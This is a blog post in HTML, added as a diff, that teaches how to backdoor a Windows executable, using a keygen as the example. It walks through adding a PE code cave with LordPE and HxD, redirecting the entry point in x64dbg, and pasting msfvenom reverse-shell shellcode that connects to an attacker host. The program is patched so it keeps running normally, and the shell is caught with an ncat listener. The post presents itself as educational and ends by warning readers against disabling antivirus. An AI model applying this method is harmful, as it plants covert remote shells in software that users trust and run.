@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><title>Backdooring Windows Executable Files &ndash; Chaotic Solutions</title>
+<meta name="description" content="A blog about things that can be used, by people.">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="http://kurobeats.github.io/css/palettes/dracula.css">
+<link rel="stylesheet" href="http://kurobeats.github.io/css/risotto.css">
+<link rel="stylesheet" href="http://kurobeats.github.io/css/custom.css">
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+    <h1 class="page__logo"><a href="http://kurobeats.github.io/" class="page__logo-inner">Chaotic Solutions</a></h1>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://kurobeats.github.io/posts/" title="">Posts</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>Backdooring Windows Executable Files</h1>
+    </header>
+    
+    <div class="content__body">
+        <p>Have you ever wondered how people conceal malicious code in binaries? I certainly did, but it wasn&rsquo;t until many years after I had repeatedly infected my personal computers with backdoored keygens. Upon conducting a brief online search, I found numerous tutorials that explained the process. However, most of them referred to antiquated tools that were no longer in use. Other tutorials that I tried out did not function as expected or advertised. Below, I have documented the approach that I ultimately adopted, which employs up-to-date tools and a modified process.</p>
+<p><em>Disclaimer:</em> For all the newbies reading this, modern anti-virus will not be evaded with this (ignoring the fact that this tutorial uses a Keygen as the example executable and will most certainly be discovered <em>without</em> the inclusion of shellcode), additional research will be required to use this information and <em>improve</em> upon it.</p>
+<p>Now to kick things off, I’d like to detail the tools we are going to be replacing:</p>
+<ul>
+<li>x64dbg instead of Ollydbg</li>
+<li>msfvenom instead of msfpayload</li>
+<li>HxD instead of XVI32</li>
+</ul>
+<p>Now that we are all setup, we are going to want to open our (currently) innocent application in LordPE (Click PE Editor), select Sections and right click to add a new section and then right click to edit the section header.</p>
+<p>Important note: I am aware that LordPE is not a new tool. However, based on my experience using it, I have not found a reason to replace it with any other tool&hellip;or anything that could replace it.</p>
+<p>Once open, we want to add roughly 1000 bytes to the new section which should be enough space for our malicious code. Also, be sure to set the Virtual and Raw size to 1000 to coincide with the addition of bytes and save.</p>
+<p><img src="/img/1.png" alt="1.png"></p>
+<p>Next, we will open our executable with HxD, scroll down to the bottom, click to bring up a cursor at the end of the hex, right click and insert bytes. The byte count should be at 1000 with the type of hex and the fill pattern to 00</p>
+<p><img src="/img/2.png" alt="2.png"></p>
+<p>Once saved, we can close Hxd, open the newly modified application in x64dbg and click the Memory Map tab to review the memory mappings. Once there, look for the .NewSec section mapping, right click and copy the address and store it for later.</p>
+<p><img src="/img/3.png" alt="3.png"></p>
+<p>Moving back to the CPU tab, we want to find the application entry point so we can replace it with a jump to our malicious code cave. This could look like anything, and if the second instruction isn’t a JMP, don’t copy the instruction, rather, copy the address and save for later.
+Now, we want to replace the first instruction with a JMP to the .NewSec address (which we copied previously).</p>
+<p><img src="/img/4.png" alt="4.png"></p>
+<p>Hit F7, and we should jump to the beginning of our .NewSec space. Before we progress to the good stuff, we are going to want to save the current stack by pushing all 8 general purpose registers and EFlags register contents onto the stack, by inserting a PUSHAD and PUSHFD.</p>
+<p><img src="/img/5.png" alt="5.png"></p>
+<p><em>Note:</em> x64dbg will translate PUSHAD to pushal</p>
+<p>Back over to our attacking machine, we will create a reverse shell payload with something like the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.51 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8899</span> -f hex
+</span></span></code></pre></div><p><img src="/img/6.png" alt="6.png"></p>
+<p>Once generated, copy and then binary paste all of the hex to begin right after our stack saving instructions. To do this, highlight the instruction right after our introduced PUSHFD instruction, right click, move to “Binary” then “Paste (Ignore Size)”.</p>
+<p><img src="/img/7.png" alt="7.png"></p>
+<p>This next part can be tricky, but what we essentially want to do is start to step through the newly introduced code (by pressing F7), however stop and make note of the value of ESP after our PUSHFD, and as always, save it for later:</p>
+<p><img src="/img/8.png" alt="8.png"></p>
+<p>After we’ve recorded this, scroll down to the end of the shell code and set a break point on the last 3 instructions. Next, jump back to our attacking machine and start a ncat listener with a command like the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ncat -nlvp <span style="color:#ae81ff">8899</span>
+</span></span></code></pre></div><p>Then, moving back to our victim machine, continue to run the program in the debugger and make note of the ESP when it hits the last breakpoint (very likely to be CALL EBP).</p>
+<p><em>Note:</em> We might need to kill the listener to reach it.</p>
+<p><img src="/img/9.png" alt="9.png"></p>
+<p>Now that we have our two ESP values, we will use them to realign our stack and access our saved values. To do this though, we will first need to work out the difference between the two values.</p>
+<p><img src="/img/10.png" alt="10.png"></p>
+<p>Once calculated, we will need to replace the CALL EBP instruction with our calculated difference with an ADD ESP instruction like so:</p>
+<p><img src="/img/11.png" alt="11.png"></p>
+<p>Following on from this, we restored our previously saved registers with a POPFD and POPAD, then restored the initial call to the program, followed by a jump back to the second instruction in our executable.</p>
+<p>Now, due to msfvenom ‘quirks’, before we patch the executable we will need to replace the following three instructions with NOPs to make sure the program continues to run without us needing to exit the reverse shell. The offending instruction will be in the order of dec esi, push esi and inc esi:</p>
+<p><img src="/img/12.png" alt="12.png"></p>
+<p><img src="/img/13.png" alt="13.png"></p>
+<p>Once replaced, we can patch our executable with our malicious shell code:</p>
+<p><img src="/img/14.png" alt="14.png"></p>
+<p>Now that we have a fully “patched” executable, we can move onto the fun part: testing! Before we run the application, we will want to start our ncat listener on our attacking machine with the command we ran during our development phase, then, run the executable:</p>
+<p><img src="/img/15.png" alt="15.png"></p>
+<p>And if all goes well, we should have a shell!</p>
+<p><img src="/img/16.png" alt="16.png"></p>
+<p>Anyway, what&rsquo;s the ultimate moral of the story? Well, if you see the torrent instructions telling you to disable your anti-virus before you run a keygen, don&rsquo;t.</p>
+
+    </div>
+    <footer class="content__footer"></footer>
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    <img class="about__logo" src="http://kurobeats.github.io/img/favicon.png" alt="Logo">
+<h1 class="about__title">Chaotic Solutions</h1>
+<p class="about__description">A blog about things that can be used, by people.</p>
+</div>
+
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://github.com/kurobeats" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://discordapp.com/users/218920799967510529" rel="me" aria-label="Discord" title="Discord"><i class="fa-brands fa-discord" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://au.linkedin.com/in/acozamanis" rel="me" aria-label="LinkedIn" title="LinkedIn"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    <p>Why we don&#39;t trust executables.</p>
+    
+        <p>
+            By Anthony Cozamanis, 
+            2017-06-26
+        </p>
+    
+
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+    
+    
+</p>
+<br /><br />
+<p class="copyright">Anthony Cozamanis (CC BY 4.0)</p>
+<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
